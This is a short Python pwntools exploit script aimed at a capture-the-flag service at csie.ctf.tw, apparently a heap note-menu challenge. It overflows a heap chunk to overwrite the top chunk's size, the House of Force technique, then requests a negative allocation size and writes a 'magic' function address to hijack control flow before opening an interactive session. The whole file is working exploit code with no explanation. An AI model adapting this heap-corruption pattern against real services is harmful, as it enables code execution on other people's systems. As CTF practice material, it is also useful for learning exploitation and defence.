#!/usr/bin/env python
from pwn import *

r = remote("csie.ctf.tw",10138)
def ad(size,name):
        r.recvuntil(":")
        r.sendline("2")
	r.recvuntil(":")
        r.sendline(str(size))
        r.recvuntil(":")
        r.sendline(name)

def show():
	r.recvuntil(":")
	r.sendline("1")

def change(index,size,name):
	r.recvuntil(":")
	r.sendline("3")
        r.recvuntil(":")
	r.sendline(str(index))
        r.recvuntil(":")
	r.sendline(str(size))
	r.recvuntil(":")
	r.sendline(name)

def rm(index):
	r.recvuntil(":")
	r.sendline("4")
	r.recvuntil(":")
        r.sendline(str(index))

magic = 0x00000000400d49
ad(0x80,"ddaa")
change(0,0x90,"a"*0x80+p64(0)+p64(0xffffffffffffffff))
ad(-0xc0,"ddaa")
ad(0x20,p64(magic)*2)
r.interactive()

